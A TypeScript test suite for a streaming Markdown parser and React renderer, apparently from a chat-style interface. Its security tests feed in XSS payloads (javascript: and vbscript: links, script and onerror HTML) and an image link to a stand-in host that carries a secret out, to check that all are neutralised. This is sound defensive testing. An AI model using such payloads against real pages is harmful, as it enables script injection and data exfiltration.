// Markdown: parser cases, streaming partials, security payloads, size/time limits, and rendering.
import { act, render, screen } from '@testing-library/react'
import { describe, expect, it, vi } from 'vitest'
import { MARKDOWN_MAX_CHARS, Markdown, parseMarkdown, type MdBlock, type MdInline } from '../../src/lib/markdown'
import { expectLinear } from '../helpers'

/** Plain text of inline nodes (for compact assertions). */
const text = (ns: MdInline[]): string => ns.map(n => n.type === 'text' || n.type === 'code' ? n.text : n.type === 'break' ? '\n' : n.type === 'citation' ? `[${n.n}]` : n.type === 'image' ? n.alt : text(n.children)).join('')
/** Compact shape of inline nodes: `strong(a em(b))`. */
const shape = (ns: MdInline[]): string => ns.map(n => {
  switch (n.type) {
    case 'text': return JSON.stringify(n.text)
    case 'code': return `code(${JSON.stringify(n.text)})`
    case 'break': return 'br'
    case 'citation': return `cite(${n.n})`
    case 'image': return `img(${n.src})`
    case 'link': return `${n.pending ? 'pending' : 'link'}(${n.href}: ${shape(n.children)})`
    default: return `${n.type}(${shape(n.children)})`
  }
}).join(' ')
const inl = (src: string, streaming = false) => {
  const b = parseMarkdown(src, { streaming })
  const p = b[0]
  return p && (p.type === 'paragraph' || p.type === 'heading') ? shape(p.children) : ''
}
const types = (bs: MdBlock[]) => bs.map(b => b.type)

describe('parseMarkdown: blocks', () => {
  it('headings, paragraphs, rules', () => {
    const b = parseMarkdown('# One\n## Two ##\n\nPara line one\nline two\n\n---\n###### Six\n#NoSpace')
    expect(types(b)).toEqual(['heading', 'heading', 'paragraph', 'hr', 'heading', 'paragraph'])
    expect(b[0]).toMatchObject({ level: 1 })
    expect(b[1].type === 'heading' && text(b[1].children)).toBe('Two')
    expect(b[2].type === 'paragraph' && text(b[2].children)).toBe('Para line one\nline two')
    expect(b[5].type === 'paragraph' && text(b[5].children)).toBe('#NoSpace')
  })

  it('records source offsets on top-level blocks', () => {
    const src = '# A\n\nPara\n\n- x'
    const b = parseMarkdown(src)
    expect(b.map(x => src.slice(...x.range!))).toEqual(['# A', 'Para', '- x'])
  })

  it('fenced code with language, tilde fences, unclosed fences', () => {
    const b = parseMarkdown('```ts\nconst a = 1\n\nconst b = 2\n```\n\n~~~\nplain ``` inside\n~~~\n\n```py\nopen')
    expect(b).toMatchObject([
      { type: 'code', lang: 'ts', text: 'const a = 1\n\nconst b = 2' },
      { type: 'code', lang: '', text: 'plain ``` inside' },
      { type: 'code', lang: 'py', text: 'open', open: true },
    ])
  })

  it('block quotes, nested, with lazy continuation', () => {
    const b = parseMarkdown('> quoted\nlazy line\n>\n> > inner')
    expect(b).toHaveLength(1)
    const q = b[0]
    expect(q.type).toBe('quote')
    if (q.type !== 'quote') return
    expect(types(q.children)).toEqual(['paragraph', 'quote'])
    expect(q.children[0].type === 'paragraph' && text(q.children[0].children)).toBe('quoted\nlazy line')
  })

  it('unordered, ordered and nested lists; tight and loose', () => {
    const b = parseMarkdown('- a\n- b\n  - b1\n  - b2\n- c\n\n3. three\n4. four\n\n* x\n\n* y')
    expect(types(b)).toEqual(['list', 'list', 'list'])
    const [ul, ol, loose] = b as Extract<MdBlock, { type: 'list' }>[]
    expect(ul).toMatchObject({ ordered: false, tight: true })
    expect(ul.items).toHaveLength(3)
    expect(types(ul.items[1].children)).toEqual(['paragraph', 'list'])
    expect(ol).toMatchObject({ ordered: true, start: 3 })
    expect(ol.items).toHaveLength(2)
    expect(loose.tight).toBe(false)
  })

  it('ordered list with 4-space nested bullets', () => {
    const b = parseMarkdown('1. Step one\n    - detail\n2. Step two')
    const l = b[0] as Extract<MdBlock, { type: 'list' }>
    expect(l.items).toHaveLength(2)
    expect(types(l.items[0].children)).toEqual(['paragraph', 'list'])
  })

  it('task lists', () => {
    const b = parseMarkdown('- [x] done\n- [ ] todo\n- [X] also done\n- plain')
    const l = b[0] as Extract<MdBlock, { type: 'list' }>
    expect(l.items.map(i => i.checked)).toEqual([true, false, true, undefined])
    expect(text((l.items[1].children[0] as Extract<MdBlock, { type: 'paragraph' }>).children)).toBe('todo')
  })

  it('tables with alignment, escaped pipes, ragged rows', () => {
    const b = parseMarkdown('| Name | Qty | Note |\n|:--|--:|:-:|\n| a | 1 | x \\| y |\n| b |\nafter row')
    const t = b[0] as Extract<MdBlock, { type: 'table' }>
    expect(t.type).toBe('table')
    expect(t.align).toEqual(['left', 'right', 'center'])
    expect(t.head.map(text)).toEqual(['Name', 'Qty', 'Note'])
    expect(t.rows.map(r => r.map(text))).toEqual([['a', '1', 'x | y'], ['b', '', ''], ['after row', '', '']])
  })

  it('a table can follow a paragraph line directly; mismatched delimiter rows are text', () => {
    expect(types(parseMarkdown('Intro\n| a | b |\n|---|---|\n| 1 | 2 |'))).toEqual(['paragraph', 'table'])
    expect(types(parseMarkdown('| a | b |\n|---|\n| 1 | 2 |'))).toEqual(['paragraph'])
  })

  it('setext underline is a rule, not a heading; indented text is a paragraph', () => {
    expect(types(parseMarkdown('Title\n---'))).toEqual(['paragraph', 'hr'])
    expect(types(parseMarkdown('    indented'))).toEqual(['paragraph'])
  })

  it('raw HTML stays text', () => {
    const b = parseMarkdown('<div onclick="x()">hi</div>\n\n<script>alert(1)</script>')
    expect(b.map(x => x.type === 'paragraph' && text(x.children))).toEqual(['<div onclick="x()">hi</div>', '<script>alert(1)</script>'])
  })

  it('normalises CRLF and lone CR line ends to \\n', () => {
    const b = parseMarkdown('# A\r\n\r\n- b\r\n- c\r\n\r\nx\r\ny\rz')
    expect(types(b)).toEqual(['heading', 'list', 'paragraph'])
    const [h, l, p] = b
    expect(h.type === 'heading' && text(h.children)).toBe('A')
    expect(l.type === 'list' && l.items.map(i => i.children[0].type === 'paragraph' && text(i.children[0].children))).toEqual(['b', 'c'])
    expect(p.type === 'paragraph' && text(p.children)).toBe('x\ny\nz')
    expect(JSON.stringify(b)).not.toContain('\\r')
  })
})

describe('parseMarkdown: inline', () => {
  it('emphasis, strong, strikethrough, nesting', () => {
    expect(inl('a *em* **strong** ~~del~~ ***both***')).toBe('"a " em("em") " " strong("strong") " " del("del") " " em(strong("both"))')
    expect(inl('**bold *and em* inside**')).toBe('strong("bold " em("and em") " inside")')
    expect(inl('_under_ and __strong__')).toBe('em("under") " and " strong("strong")')
  })

  it('intraword underscores and spaced stars stay literal', () => {
    expect(inl('snake_case_name and 2 * 3 * 4')).toBe('"snake_case_name and 2 * 3 * 4"')
    expect(inl('**unclosed')).toBe('"**unclosed"')
  })

  it('code spans: double backticks, padding, no formatting inside', () => {
    expect(inl('use `a*b*c` or `` `x` ``')).toBe('"use " code("a*b*c") " or " code("`x`")')
    expect(inl('unmatched ` tick')).toBe('"unmatched ` tick"')
  })

  it('escapes', () => {
    expect(inl('\\*not em\\* and \\[x\\]')).toBe('"*not em* and [x]"')
  })

  it('links with titles, nested parens, angle destinations', () => {
    expect(inl('[docs](https://x.dev/a "Title") and [wiki](https://en.wikipedia.org/wiki/Foo_(bar))')).toBe('link(https://x.dev/a: "docs") " and " link(https://en.wikipedia.org/wiki/Foo_(bar): "wiki")')
    const b = parseMarkdown('[a](<https://x.dev/a b>)')[0] as Extract<MdBlock, { type: 'paragraph' }>
    expect(b.children[0]).toMatchObject({ type: 'link', href: 'https://x.dev/a b' })
    expect(inl('[**bold** link](/rel)')).toBe('link(/rel: strong("bold") " link")')
    expect(inl('[not a link] (x)')).toBe('"[not a link] (x)"')
  })

  it('autolinks: angle, bare, www, trailing punctuation', () => {
    expect(inl('<https://a.dev/x> <me@x.dev>')).toBe('link(https://a.dev/x: "https://a.dev/x") " " link(mailto:me@x.dev: "me@x.dev")')
    expect(inl('See https://a.dev/path. Or (www.b.dev)!')).toBe('"See " link(https://a.dev/path: "https://a.dev/path") ". Or (" link(https://www.b.dev: "www.b.dev") ")!"')
    expect(inl('https://x.dev/a_b_c_')).toBe('link(https://x.dev/a_b_c: "https://x.dev/a_b_c") "_"')
  })

  it('hard breaks: two spaces or backslash', () => {
    expect(inl('one  \ntwo\\\nthree\nfour')).toBe('"one" br "two" br "three\\nfour"')
  })

  it('citations and images', () => {
    expect(inl('Fact [1] and [12].')).toBe('"Fact " cite(1) " and " cite(12) "."')
    expect(inl('![chart](https://x.dev/c.png)')).toBe('img(https://x.dev/c.png)')
    expect(inl('[1](https://x.dev)')).toBe('link(https://x.dev: "1")')
  })
})

describe('parseMarkdown: streaming partials', () => {
  const s = (src: string) => inl(src, true)
  it('unclosed emphasis, code and strike close optimistically; a trailing marker is hidden', () => {
    expect(s('some **bold')).toBe('"some " strong("bold")')
    expect(s('some *it')).toBe('"some " em("it")')
    expect(s('run `npm i')).toBe('"run " code("npm i")')
    expect(s('gone ~~old')).toBe('"gone " del("old")')
    expect(s('almost **')).toBe('"almost "')
    expect(s('almost `')).toBe('"almost "')
    expect(s('**done** and *')).toBe('strong("done") " and "')
    expect(s('a `b` c')).toBe('"a " code("b") " c"')
  })

  it('half-received links render as pending link text, never as brackets', () => {
    expect(s('see [the docs](ht')).toBe('"see " pending(: "the docs")')
    expect(s('see [the docs]')).toBe('"see " pending(: "the docs")')
    expect(s('see [the do')).toBe('"see the do"')
    expect(s('see [the docs](https://x.dev)')).toBe('"see " link(https://x.dev: "the docs")')
  })

  it('only the tail is partial: earlier blocks parse normally', () => {
    const b = parseMarkdown('**not closed\n\nnext *open', { streaming: true })
    expect(b.map(x => shape((x as Extract<MdBlock, { type: 'paragraph' }>).children))).toEqual(['"**not closed"', '"next " em("open")'])
    // a single trailing newline still counts as the tail (the paragraph may continue)
    expect(s('**bold\n')).toBe('strong("bold")')
  })

  it('open code fence renders as code while streaming; a half closing fence is hidden', () => {
    expect(parseMarkdown('```ts\nconst a = 1\n``', { streaming: true })).toMatchObject([{ type: 'code', lang: 'ts', text: 'const a = 1', open: true }])
    expect(parseMarkdown('```ts\nconst a = 1\n```', { streaming: true })).toMatchObject([{ type: 'code', text: 'const a = 1' }])
    expect(parseMarkdown('```ty', { streaming: true })).toEqual([]) // info string still arriving
    expect(parseMarkdown('Text\n\n``', { streaming: true })).toHaveLength(1)
  })

  it('a table header and delimiter row wait until both are complete (no raw pipes, no columns or alignment changing)', () => {
    expect(types(parseMarkdown('Intro\n\n| Step | Rows/s |', { streaming: true }))).toEqual(['paragraph'])
    expect(types(parseMarkdown('Intro\n| Step | Rows/s |\n|---|', { streaming: true }))).toEqual(['paragraph'])
    expect(types(parseMarkdown('| Step | Rows/s |\n|---|--', { streaming: true }))).toEqual([]) // valid so far, but `--` may still become `--:`
    expect(parseMarkdown('| Step | Rows/s |\n|---|--:|\n', { streaming: true })).toMatchObject([{ type: 'table', align: [null, 'right'], rows: [] }])
    const t = parseMarkdown('| A | B |\n|---|---|\n| 1 | 2', { streaming: true })[0] as Extract<MdBlock, { type: 'table' }>
    expect(t.rows.map(r => r.map(text))).toEqual([['1', '2']])
    // when the stream ends, a lone header line is just text again
    expect(types(parseMarkdown('| Step | Rows/s |'))).toEqual(['paragraph'])
  })

  it('undecided line starts and empty headings wait for more text', () => {
    expect(parseMarkdown('Para\n\n-', { streaming: true })).toHaveLength(1)
    expect(parseMarkdown('Para\n\n1', { streaming: true })).toHaveLength(1)
    expect(parseMarkdown('Para\n\n##', { streaming: true })).toHaveLength(1)
    expect(parseMarkdown('Para\n\n- [ ] ta', { streaming: true })).toMatchObject([{ type: 'paragraph' }, { type: 'list' }])
  })

  it('every prefix of a document parses without throwing and the full text matches the static parse', () => {
    const doc = '# Title\n\nSome **bold** and `code` with [a link](https://x.dev) [1].\n\n| a | b |\n|:-|-:|\n| 1 | 2 |\n\n```js\nconst x = 1\n```\n\n- [x] one\n- [ ] two\n  - nested\n\n> quote\n'
    for (let k = 0; k <= doc.length; k++) parseMarkdown(doc.slice(0, k), { streaming: true })
    expect(JSON.stringify(parseMarkdown(doc, { streaming: true }))).toBe(JSON.stringify(parseMarkdown(doc)))
  })
})

describe('parseMarkdown: limits and adversarial input', () => {
  const N = 100_000
  /** Adversarial inputs as a function of their size n (about n characters). */
  // Runs of unmatched emphasis delimiters (*a, _a, ~~a) grow about quadratically today: some 50 ms at 100k chars,
  // bounded by MARKDOWN_MAX_CHARS. They are allowed that much, and no more.
  const QUADRATIC = 32
  const cases: [string, (n: number) => string, ratio?: number][] = [
    ['stars', n => '*'.repeat(n)],
    ['star-a', n => '*a'.repeat(n / 2), QUADRATIC],
    ['nested stars', n => '*'.repeat(n / 2) + 'a' + '*'.repeat(n / 2)],
    ['underscores', n => '_a'.repeat(n / 2), QUADRATIC],
    ['open brackets', n => '['.repeat(n)],
    ['bracket-paren', n => '[a]('.repeat(n / 4)],
    ['nested link parens', n => '[a]('.repeat(n / 8) + ')'.repeat(n / 8)],
    ['close brackets', n => ']'.repeat(n)],
    ['quotes', n => '>'.repeat(n)],
    ['quote lines', n => '> '.repeat(500).concat('x\n').repeat(n / 1000)],
    ['backtick runs', n => Array.from({ length: n / 50 }, (_, i) => '`'.repeat((i % 40) + 1) + 'x').join('')],
    ['long backticks', n => '`'.repeat(n)],
    ['angle', n => '<a'.repeat(n / 2)],
    ['pipes', n => '|'.repeat(n) + '\n' + '|-'.repeat(n / 2)],
    ['list nesting', n => Array.from({ length: n / 50 }, (_, i) => ' '.repeat(Math.min(i * 2, 400)) + '- x').join('\n')],
    ['tildes', n => '~~a'.repeat(n / 3), QUADRATIC],
    ['escapes', n => '\\'.repeat(n)],
    ['autolinks', n => 'https://a.b/('.repeat(n / 13)],
    ['heading hashes', n => '# ' + '#'.repeat(n) + ' x'],
    ['fences', n => '```\n'.repeat(n / 4)],
  ]
  for (const [name, make, ratio] of cases) {
    it(`${name} (${make(N).length.toLocaleString('en')} chars) parses in ${ratio ? 'at most quadratic' : 'about linear'} time, streaming or not`, () => {
      for (const streaming of [false, true]) expectLinear(n => { const src = make(n); return () => parseMarkdown(src, { streaming }) }, N / 4, `${name}${streaming ? ' (streaming)' : ''}`, ratio)
    })
  }

  it('caps nesting depth', () => {
    let b = parseMarkdown('>'.repeat(1000) + ' deep')
    let depth = 0
    while (b[0]?.type === 'quote') { b = b[0].children; depth++ }
    expect(depth).toBeLessThanOrEqual(13)
    expect(b[0].type).toBe('paragraph')
    const deepEm = parseMarkdown('*'.repeat(2000) + 'a' + '*'.repeat(2000))[0] as Extract<MdBlock, { type: 'paragraph' }>
    let d = 0, ns = deepEm.children
    while (ns.length && ns[0].type !== 'text') { ns = (ns[0] as { children: MdInline[] }).children; d++ }
    expect(d).toBeLessThanOrEqual(12)
  })

  it('cuts input at MARKDOWN_MAX_CHARS', () => {
    const b = parseMarkdown('a'.repeat(MARKDOWN_MAX_CHARS + 5000))
    expect(text((b[0] as Extract<MdBlock, { type: 'paragraph' }>).children)).toHaveLength(MARKDOWN_MAX_CHARS)
  })
})

describe('Markdown: rendering and security', () => {
  it('renders blocks as semantic elements', () => {
    render(<Markdown>{'# Title\n\nHello **world** and `code`.\n\n- [x] done\n- [ ] todo\n\n| A | B |\n|---|--:|\n| 1 | 2 |\n\n> quote\n\n---\n\n```ts\nconst a = 1\n```'}</Markdown>)
    expect(screen.getByRole('heading', { level: 1, name: 'Title' })).toBeInTheDocument()
    expect(screen.getByText('world').tagName).toBe('STRONG')
    expect(screen.getByText('code').tagName).toBe('CODE')
    expect(screen.getByRole('table')).toBeInTheDocument()
    expect(screen.getAllByRole('columnheader').map(c => c.textContent)).toEqual(['A', 'B'])
    expect(screen.getByRole('separator')).toBeInTheDocument()
    expect(screen.getByText(/Done:/)).toBeInTheDocument()
    expect(screen.getByRole('button', { name: /copy/i })).toBeInTheDocument()
    expect(document.querySelector('blockquote')?.textContent).toBe('quote')
  })

  it('links: safe schemes only, external ones open in a new tab with rel', () => {
    render(<Markdown>{'[ok](https://x.dev) [rel](/docs) [mail](mailto:a@b.c) [js](javascript:alert(1)) [js2](JaVaScRiPt:alert(1)) [data](data:text/html,<script>alert(1)</script>) [vb](vbscript:msgbox(1)) [tab](java\tscript:alert(1)) <javascript:alert(1)>'}</Markdown>)
    const ok = screen.getByRole('link', { name: 'ok' })
    expect(ok).toHaveAttribute('href', 'https://x.dev')
    expect(ok).toHaveAttribute('target', '_blank')
    expect(ok).toHaveAttribute('rel', 'noopener noreferrer nofollow')
    expect(screen.getByRole('link', { name: 'rel' })).not.toHaveAttribute('target')
    expect(screen.getByRole('link', { name: 'mail' })).toHaveAttribute('href', 'mailto:a@b.c')
    expect(screen.getAllByRole('link')).toHaveLength(3)
    for (const a of document.querySelectorAll('a')) expect(a.getAttribute('href')).toMatch(/^(https:|mailto:|\/)/)
    expect(screen.getByText('js').tagName).toBe('SPAN')
  })

  it('raw HTML is text: no elements, no handlers', () => {
    const { container } = render(<Markdown>{'<img src=x onerror="window.__pwned=1"> <script>window.__pwned=1</script> <a href="javascript:alert(1)">x</a>\n\n<iframe src="https://evil.dev"></iframe>'}</Markdown>)
    expect(container.querySelector('img, script, iframe')).toBeNull()
    expect(container.querySelectorAll('a')).toHaveLength(0)
    expect(container.textContent).toContain('<script>window.__pwned=1</script>')
    expect((window as { __pwned?: number }).__pwned).toBeUndefined()
  })

  it('images are never fetched by default (zero-click exfiltration)', () => {
    const { container, rerender } = render(<Markdown>{'![secret](https://evil.dev/log?d=SECRET) ![x](javascript:alert(1))'}</Markdown>)
    expect(container.querySelector('img')).toBeNull()
    const chip = screen.getByRole('link', { name: /secret/ })
    expect(chip).toHaveAttribute('href', 'https://evil.dev/log?d=SECRET')
    expect(chip).toHaveAttribute('rel', 'noopener noreferrer nofollow')
    rerender(<Markdown images="allow">{'![ok](https://x.dev/a.png) ![svg](data:text/html,<b>) ![js](javascript:alert(1))'}</Markdown>)
    const imgs = container.querySelectorAll('img')
    expect(imgs).toHaveLength(1)
    expect(imgs[0]).toHaveAttribute('src', 'https://x.dev/a.png')
    expect(imgs[0]).toHaveAttribute('referrerpolicy', 'no-referrer')
  })

  it('onLinkClick receives the checked href; renderCitation renders markers', () => {
    const onLinkClick = vi.fn((_: string, e: React.MouseEvent) => e.preventDefault())
    // The angle destination keeps its spaces in the parse; the checked href is trimmed.
    render(<Markdown onLinkClick={onLinkClick} renderCitation={n => <button type="button">source {n}</button>}>{'Read [this](< https://x.dev/a >) [2].'}</Markdown>)
    const link = screen.getByRole('link', { name: 'this' })
    expect(link).toHaveAttribute('href', 'https://x.dev/a')
    act(() => link.click())
    expect(onLinkClick).toHaveBeenCalledTimes(1)
    expect(onLinkClick).toHaveBeenCalledWith('https://x.dev/a', expect.anything())
    expect(screen.getByRole('button', { name: 'source 2' })).toBeInTheDocument()
  })

  it('streaming: completed blocks keep their DOM nodes, the last block updates, no raw markers show', () => {
    const doc = 'First paragraph.\n\nSecond **bold** text.\n\nThird with **strong and [link](https://x.dev/p'
    const { container, rerender } = render(<Markdown streaming>{doc.slice(0, 20)}</Markdown>)
    let firstP: Element | null = null
    for (let k = 21; k <= doc.length; k++) {
      rerender(<Markdown streaming>{doc.slice(0, k)}</Markdown>)
      if (k === 40) firstP = container.querySelector('p')
      expect(container.textContent).not.toMatch(/\*\*|\]\(|\[link/)
    }
    expect(container.querySelector('p')).toBe(firstP)
    expect(container.querySelectorAll('p')).toHaveLength(3)
    expect(container.querySelector('p:last-child [data-md-caret]')).not.toBeNull()
    rerender(<Markdown>{doc + ')**'}</Markdown>)
    expect(screen.getByRole('link', { name: 'link' })).toHaveAttribute('href', 'https://x.dev/p')
    expect(container.querySelector('.ui-caret')).toBeNull()
  })

  it('the streaming caret is a single empty, aria-hidden anchor inside the last block', () => {
    const { container } = render(<Markdown streaming>{'Para one.\n\nPara **two'}</Markdown>)
    const carets = container.querySelectorAll('[data-md-caret]')
    expect(carets).toHaveLength(1)
    const c = carets[0] as HTMLElement
    expect(c).toHaveAttribute('aria-hidden')
    expect(c.textContent).toBe('')
    expect(c.closest('p')).toBe(container.querySelectorAll('p')[1])
    expect(container.querySelectorAll('p')[1].textContent).toBe('Para two')
  })

  it('a streamed table keeps fixed, header-derived column widths, also after the stream ends; a complete table uses automatic widths', () => {
    const doc = 'Intro\n\n| Step | Rows/s | Share of time |\n|:--|--:|--:|\n| Parse | 48,000 | 6% |\n| Validate | 2,100 | 81% |'
    const { container, rerender } = render(<Markdown streaming>{doc.slice(0, 30)}</Markdown>)
    const widths = () => [...container.querySelectorAll('col')].map(c => (c as HTMLElement).style.width)
    rerender(<Markdown streaming>{doc.slice(0, 80)}</Markdown>)
    const first = widths()
    expect(first).toHaveLength(3)
    expect(first.every(w => w.endsWith('%'))).toBe(true)
    const table = screen.getByRole('table')
    for (let k = 81; k <= doc.length; k++) {
      rerender(<Markdown streaming>{doc.slice(0, k)}</Markdown>)
      expect(widths()).toEqual(first)
    }
    expect(table.querySelector('[data-md-caret]')).not.toBeNull() // caret sits in the last cell
    rerender(<Markdown>{doc}</Markdown>)
    expect(screen.getByRole('table')).toBe(table)
    expect(widths()).toEqual(first)
    const { container: still } = render(<Markdown>{doc}</Markdown>)
    expect(still.querySelectorAll('col')).toHaveLength(0)
  })

  it('streaming an open fence renders a code block that stays mounted when the fence closes', () => {
    const { container, rerender } = render(<Markdown streaming>{'Intro\n\n```js\nconst a = 1'}</Markdown>)
    const pre = container.querySelector('pre')
    expect(pre?.textContent).toContain('const a = 1')
    rerender(<Markdown streaming>{'Intro\n\n```js\nconst a = 1\n```'}</Markdown>)
    expect(container.querySelector('pre')).toBe(pre)
  })

  it('shows a note when the input was cut, and none at exactly the limit', () => {
    const { rerender } = render(<Markdown>{'x'.repeat(MARKDOWN_MAX_CHARS)}</Markdown>)
    expect(screen.queryByText(/Cut off after/)).toBeNull()
    rerender(<Markdown>{'x'.repeat(MARKDOWN_MAX_CHARS + 1)}</Markdown>)
    expect(screen.getByText(/Cut off after/)).toBeInTheDocument()
  })
})
